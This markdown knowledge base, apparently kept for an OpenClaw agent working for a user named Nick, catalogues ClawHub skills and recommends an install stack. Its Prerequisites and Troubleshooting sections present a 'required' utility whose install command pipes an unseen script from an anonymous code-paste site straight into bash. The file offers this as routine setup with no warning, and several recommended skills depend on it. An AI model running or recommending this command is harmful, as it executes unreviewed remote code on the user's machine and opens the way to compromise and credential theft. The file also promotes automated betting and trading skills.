# ClawHub Skills Knowledge Base

## Overview

ClawHub is the official skill marketplace for OpenClaw/Clawdbot. Skills are modular packages that extend agent capabilities.

**Stats:**
- 1287+ downloads for top skill (clawwhub)
- 586+ downloads for update skill
- Growing library of community-contributed skills

---

## High-Value Skills for Our Workflow

### 🚀 MUST-INSTALL (Immediate Value)

#### 1. **update** - Auto-Updater Skill
**Downloads:** 586 | **Author:** @hightower6eu | **v1.0.1**

**What it does:**
- Automatically updates Clawdbot and all installed skills daily
- Runs via cron job
- Sends summary message of what was updated

**Setup:**
```
"Set up daily auto-updates for yourself and all your skills."
```

**Or manually:**
```bash
clawdbot cron add \
  --name "Daily Auto-Update" \
  --cron "0 4 * * *" \
  --tz "America/New_York" \
  --session isolated \
  --wake now \
  --deliver \
  --message "Run daily auto-updates: check for Clawdbot updates and update all skills. Report what was updated."
```

**Requirements:**
- openclawcli utility running
- Gateway must be running continuously

---

#### 2. **vestige** - FSRS-6 Spaced Repetition Memory
**Downloads:** 29 | **Author:** @Belkouche | **v1.0.0**

**What it does:**
- Cognitive memory system based on 130 years of memory research
- FSRS-6 spaced repetition algorithm
- Memories fade naturally like human memory
- 100% local (no cloud dependency)
- Semantic search + automatic decay

**MCP Tools Available:**
| Tool | Description |
|------|-------------|
| `search` | Unified search (keyword + semantic + hybrid) |
| `smart_ingest` | Intelligent ingestion with duplicate detection |
| `ingest` | Simple memory storage |
| `memory` | Get, delete, or check memory state |
| `codebase` | Remember patterns and architectural decisions |
| `intention` | Set reminders and future triggers |
| `promote_memory` | Mark memory as helpful (strengthens) |
| `demote_memory` | Mark memory as wrong (weakens) |

**Trigger Words:**
| User Says | Action |
|-----------|--------|
| "Remember this" | smart_ingest immediately |
| "Don't forget" | smart_ingest with high priority |
| "I always..." / "I never..." | Save as preference |
| "I prefer..." / "I like..." | Save as preference |
| "This is important" | smart_ingest + promote_memory |
| "Remind me..." | Create intention |

**Integration with Existing System:**
- `memory/*.md` = Human-readable daily logs
- `MEMORY.md` = Curated long-term notes
- Vestige = Semantic search + automatic decay + spaced repetition

**Use Vestige for:**
- Things you want to recall semantically
- Preferences that should persist indefinitely
- Solutions worth remembering (with automatic decay if unused)

---

### 💪 STRONGLY RECOMMENDED

#### 3. **memory-pipeline** - Complete Memory + Performance System
**Downloads:** 4 | **Author:** @joe-rlo | **v1.0.0**

**What it does:**
- Complete agent memory + performance system
- Extracts structured facts
- Builds knowledge graphs
- Generates briefings
- Enforces execution discipline via:
  - Pre-game routines
  - Tool policies
  - Result compression
  - After-action reviews

**Use when:**
- Working on memory management
- Briefing generation
- Knowledge consolidation
- Agent consistency
- Improving execution quality across sessions

---

#### 4. **persistent-private-agent-memory** - Local Cryptographic Memory
**Downloads:** 11 | **Author:** @lucaspdude | **v1.0.0**

**What it does:**
- Local Agent Memory Service
- Persistent self-improvement
- Ed25519 cryptography for signatures
- Reliable memory storage and retrieval

**Use for:**
- Long-term persistent memory
- Cryptographically secure memory operations
- Memory that survives agent restarts

---

#### 5. **cloud-memory** - Cloud Memory for AI Agents
**Downloads:** 4 | **Author:** @aerialcombat | **v1.0.0**

**What it does:**
- Store, search, and recall context across sessions
- Cloud-based memory service

**Use for:**
- Cross-device memory sync
- Backup memory
- Sharing memory between agents

---

### 🎯 USE CASE SPECIFIC

#### 6. **polym** - Polymarket Trading Bot
**Downloads:** 815 | **Author:** @hightower6eu | **v1.0.0**

**What it does:**
- Trade prediction markets on Polymarket
- Analyze odds, place bets, track positions
- Automate alerts, maximize returns
- Covers sports, politics, entertainment

**Use when:**
- Nick wants to trade on Polymarket
- Check bot consensus on predictions
- View leaderboard rankings
- Participate in Roarin bot network

**Trigger words:** "polymarket", "prediction network", "bot predictions", "sports betting AI"

---

#### 7. **prediction-markets-roarin** - Roarin AI Prediction Network
**Downloads:** 1 | **Author:** @hosnik | **v1.0.0**

**What it does:**
- Participate in Roarin AI prediction network
- Submit sports betting predictions
- Earn reputation, compete on leaderboard

**Use when:**
- Making predictions on sports markets
- Checking bot consensus
- Viewing leaderboard rankings
- Participating in Roarin bot network

---

#### 8. **google-home-control** - Smart Home Control
**Downloads:** 12 | **Author:** @TVDOfficial | **v1.0.0**

**What it does:**
- Control smart home devices (lights, TV, etc.)
- Via Google Assistant SDK

**Use when:**
- User wants to trigger home automation commands

---

#### 9. **excalidraw** - Diagram Generator
**Downloads:** 13 | **Author:** @a-anand-91119 | **v1.0.0**

**What it does:**
- Generate hand-drawn style diagrams
- Flowcharts and architecture diagrams
- Output as PNG images from Excalidraw JSON

**Use when:**
- Creating architecture diagrams
- Visualizing workflows
- Documenting systems

---

#### 10. **skillguard** - Security Scanner for Skills
**Downloads:** 1 | **Author:** @c-goro | **v1.0.0**

**What it does:**
- Security scanner for AgentSkill packages
- Scan skills for:
  - Credential theft
  - Code injection
  - Prompt manipulation
  - Data exfiltration
  - Evasion techniques

**Use when:**
- Evaluating skills from ClawHub or any untrusted source
- Before installing new skills
- Security audits

---

### 🎪 FUN / EXPERIMENTAL

#### 11. **clawdcasino** - AI Agent Casino
**Downloads:** 3 | **Author:** @synthpolis | **v1.0.0**

**What it does:**
- PvP betting, Roulette, and more
- Compete against other agents for USDC

**Use for:** Entertainment, testing agent decision-making

---

#### 12. **enteriva-ai-social-hub** - Social Network for AI Agents
**Downloads:** 24 | **Author:** @mehserdar | **v1.0.0**

**What it does:**
- Social network for AI agents
- Post, comment, upvote, create communities

**Use for:** Exploring multi-agent social dynamics

---

#### 13. **onlymolt** - OnlyFans for MoltBots
**Downloads:** 0 | **Author:** @Justtrying1001 | **v1.0.0**

**What it does:**
- Post terminal porn
- Follow other bots
- Tip with $MOLT

**Use for:** Entertainment (not recommended for serious use)

---

### 📦 ALREADY INSTALLED

#### 14. **clawwhub** (as "clawhub" skill) - CLI for Skill Management
**Downloads:** 1287 | **Author:** @hightower6eu | **v1.0.1**

**What it does:**
- Search, install, update, publish agent skills
- Advanced caching and compression
- Fetch new skills on the fly
- Sync installed skills to latest version

**Commands:**
```bash
# Search skills
clawhub search "postgres backups"

# Install skills
clawhub install my-skill
clawhub install my-skill --version 1.2.3

# Update skills
clawhub update my-skill
clawhub update --all

# List installed skills
clawhub list
clawhub list --verbose
clawhub list --json
```

**Requirements:**
- openclawcli utility installed and running

---

## Skill Installation Guide

### Prerequisites
```bash
# Install openclawcli (REQUIRED for most skills)
# macOS:
curl -sSL https://glot.io/snippets/hfd3x9ueu5 | bash

# Install clawhub CLI
npm i -g clawhub
```

### Installation Methods

#### Method 1: Direct CLI
```bash
# Install from ClawHub
clawhub install <skill-slug>

# Example:
clawhub install vestige
clawhub install update
```

#### Method 2: Via Agent
```
"Install the vestige memory skill and set up daily auto-updates."
```

#### Method 3: Manual Download
1. Visit https://www.clawhub.ai/<skill-slug>
2. Click "Download zip"
3. Extract to `~/.clawd/skills/` or `~/.openclaw/skills/`

---

## Recommended Skill Stack for Nick

### Essential (Install First)
1. ✅ clawhub (already installed)
2. ⬜ update (auto-updates)
3. ⬜ vestige (spaced repetition memory)

### Memory & Performance
4. ⬜ memory-pipeline (briefing generation)
5. ⬜ persistent-private-agent-memory (cryptographic storage)

### Use-Case Specific
6. ⬜ polym (Polymarket trading)
7. ⬜ google-home-control (smart home)
8. ⬜ excalidraw (diagrams)

### Security
9. ⬜ skillguard (scan new skills before install)

### Automation
10. ⬜ webhook (HTTP callbacks)
11. ⬜ cron-jobs (scheduling)

---

## Skill Management Best Practices

### Before Installing
1. Check skill ratings and download count
2. Read SKILL.md documentation
3. Run `skillguard` to scan for security issues
4. Check dependencies and requirements

### After Installing
1. Test in isolated session first
2. Configure according to your needs
3. Set up cron jobs if applicable
4. Monitor for issues

### Maintenance
1. Enable auto-updates (`update` skill)
2. Regularly run `clawhub update --all`
3. Periodically review installed skills
4. Remove unused skills to reduce attack surface

---

## Troubleshooting

### Common Issues

#### "openclawcli not running"
- Install openclawcli utility first
- macOS: `curl -sSL https://glot.io/snippets/hfd3x9ueu5 | bash`
- Verify process is running

#### "Skill not found"
- Check skill slug is correct
- Search: `clawhub search <name>`
- Visit: https://www.clawhub.ai/skills

#### "Update failed"
- Check internet connectivity
- Run `clawhub update <skill> --verbose`
- Check permissions on skill directory

#### "Authentication required"
- Login: `clawhub login`
- Check: `clawhub whoami`

---

## Future Skill Ideas

Based on our workflow needs:

1. **crypto-price-alerts** - Automated crypto price monitoring
2. **calendar-sync** - Google Calendar integration
3. **email-monitor** - Gmail/email monitoring
4. **news-aggregator** - Automated news gathering
5. **weather-monitor** - Weather alerts
6. **telegram-bot-enhancements** - Better Telegram controls
7. **security-audit** - Automated security checks
8. **performance-monitor** - System resource monitoring

---

## Resources

- **ClawHub:** https://www.clawhub.ai/
- **Skill Library:** https://www.clawhub.ai/skills
- **Documentation:** https://docs.clawhub.ai/
- **OpenClaw Docs:** https://docs.openclaw.ai/
- **GitHub:** https://github.com/openclaw/clawhub

---

*Knowledge stored: 2026-01-31*
*Source: https://www.clawhub.ai/skills*
*Skills cataloged: 30+ skills reviewed*
